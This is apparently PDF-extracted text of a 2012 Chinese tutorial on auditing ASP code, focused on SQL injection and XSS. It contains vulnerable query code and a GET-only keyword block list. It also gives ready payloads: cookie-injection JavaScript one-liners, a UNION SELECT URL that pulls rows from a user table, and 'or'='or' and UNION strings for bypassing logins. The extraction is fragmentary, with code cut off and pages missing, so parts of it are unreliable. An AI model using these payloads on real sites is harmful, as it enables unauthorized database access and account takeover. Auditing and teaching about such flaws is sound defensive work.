Asp 安全审计
http://hi.baidu.com/micropoor
1
ASP
ASP
ASP
ASP 代码安全审计
------PHP
------PHP
------PHP
------PHP 安全新闻早 8888 点特别篇
2012/3/20
注入漏洞：
1.Request.QueryString：获取地址栏参数(以及以 GET 方式提交的数据)
如：Request.QueryString("id")
2.Request.Form：
获取以 POST 方式提交的数据(接收 Form 提交来的数据)
如：Request.Form("id")
3.Request.Cookies:
获取浏览器 Cookier 信息。
4.Request：包含以上三种方式(优先获取 GET 方式提交的数据)，它会在 QueryString、Form、
ServerVariable 中都搜寻一遍。而且有时候也会得到不同的结果。
如：Request("id")
例示代码：
"" then
set rst=server.createobject("adodb.recordset")
Asp 安全审计
http://hi.baidu.com/micropoor
2
sql="select
user
from
users
where
username='"&request("username")&"'
and
password='"&md5(request("pws"))&"'" //注意两者的 sql
rst.open sql,conn,1,3
%>
"" Then (对 Request.QueryString 提交(客户采用 GET 方式提交)的数
据进行判断,并没有指明对其它方式提交的数据进行判断)
'自定义需要过滤的字串,用 "|" 分隔
Fy_In
=
"'|;|%|*|and|exec|insert|select|delete|update|count|chr|mid|master|truncate|char|declare|script" ( 阻止
了常用的 SQL 注入的语句)
Fy_Inf = split(Fy_In,"|")
For Each Fy_Get In Request.QueryString
For Fy_Xh=0 To Ubound(Fy_Inf)
If Instr(LCase(Request.QueryString(Fy_Get)),Fy_Inf(Fy_Xh))<>0 Then
zruserip=Request.ServerVariables("HTTP_X_FORWARDED_FOR")
If zruserip="" Then zruserip=Request.ServerVariables("REMOTE_ADDR")
Response.Write "内容含有非法字符！请不要有'或 and 或 or 等字符，请去掉这些字符再发！！
"
Response.Write "如是要攻击网站，系统记录了你的操作↓"
Response.Write "操作ＩＰ："&zruserip&""
Response.Write "操作时间："&Now&""
Response.Write "操作页面："&Request.ServerVariables("URL")&""
Response.Write "提交方式：ＧＥＴ"
Response.Write "提交参数："&Fy_Get&""
Response.Write "提交数据："&Request.QueryString(Fy_Get)
%>
//cookie 注入其原理也和平时的注入一样，只不过提交的参数已 cookie 方式提交了，而一般
的注入我们是使用 get 或者 post 方式提交，get 方式提交就是直接在网址后面加上需要注入
的语句，post 则是通过表单方式，get 和 post 的不同之处就在于一个我们可以通过 IE 地址栏
处看到我们提交的参数，而另外一个却不能。
程序阻止了常用的 SQL 语句使用,但只对客户采用 GET 方式提交的数据进行判断,而没有对
其它方式提交的数据进行判断,导致了 Request.cookie 方式来提交变量的值,而绕过了 SQL 防
注入件
cookies 的注入语句:javascript:alert(document.cookie="id="+escape("这就是 asp? id=xx 后面 xx
代表的数值) and (这里是注入攻击代码)"));
Asp 安全审计
http://hi.baidu.com/micropoor
3
判断 cookies 注入 js 语句：
javascript:alert(document.cookie="
参
数
=
"+escape("
参
数
值
and
1=1"));self.open("http://+"document.location.host+document.location.pathname);void(0);
javascript:alert(document.cookie="
参
数
="+escape("
参
数
值
and
1=2"));self.open("http://+"document.location.host+document.location.pathname);void(0);
 "" Then
Condition = Condition & " AND BigClassId=" & BigClassId & ""
End If
If SmallClassId <> "" Then
Condition = Condition & " AND SmallClassId=" & SmallClassId & ""
End If
If SearchCondition = "1" Then
Condition = Condition & " AND ProductName LIKE '%" & ProductName & "%'"
End If
Asp 安全审计
http://hi.baidu.com/micropoor
4
If SearchCondition = "2" Then
Condition = Condition & " AND ProductDetail LIKE '%" & ProductName & "%'"
Else
Condition = Condition & " AND title LIKE '%" & title & "%'"
End If
Set RsProductSearchResult = Server.CreateObject("ADODB.RECORDSET")
RsProductSearchResult.Open "Select * FROM news Where "& Condition &" orDER BY
news_id DESC",conn,1,3
//略
%>
语句变成:
Select * FROM news Where 1=1 AND title LIKE '%micropoor%' orDER BY news_id DESC //正
常语句
Select * FROM news Where 1=1 AND title LIKE '%micropoor%' and 1=2 union select
1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19 from user where 1=1 orDER BY news_id DESC //
我们需要的语句
//前半部分的查询为假，后半部分为真，在使用 union 联合查询中，若前面查询为假的话，
那么就返回 union 查询的结果。
最 终 的 的 语 句 就 变 成 ： micropoor.asp?title=micropoor%25' and 1=2 union select
1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19 from user where 1=1 and name like '%25admin
//闭合 sql 语句
提交'or'='or'那么 SQL 语句就变成：select * from Manage_User where UserName=''or'='or''
登陆口（login.asp）的代码：
提交'union select 1,2,3,'225cdc811adfe8d4' from admin_user where 'a'='a 后我们再来分析下验
证程序，
SQL 语句会变成：Select admin_id, admin_salt, admin_password FROM admin_users Where
admin_login = ''union select 1,2,3,'225cdc811adfe8d4' from admin_user where 'a'='a'
最终的执行结果是真，这样就解决了绕过用户名验证阶段，进入密码验证阶段。
爆库漏洞以及写入一句话漏洞：
绝对路径与相对路径的冲突：
跨站漏洞：
一类是存储型 XSS，主要出现在让用户输入数据，供留言、评论、各类表单等。一类是参
数型 XSS，主要是将脚本加入 URL 地址的程序参数里，参数进入程序后在页面直接输出脚
本内容，用户点击类似的恶意链接就可能受到攻击。传统的 XSS 攻击都是盘算如何盗取客
户端 COOKIE，然后劫持客户端和 WEB 服务端的会话，其他还有利用 XSS 进行网络钓鱼
的攻击方法，这类攻击都是针对客户端进行攻击，而近年流行的 XSS WORM 攻击方式，是
Asp 安全审计
http://hi.baidu.com/micropoor
7
通过 AJAX 技术把恶意的 XSS 数据感染到每一个用户，可以对 WEB 服务造成很大的影响，
间接实现了对 WEB 服务端的攻击。
<%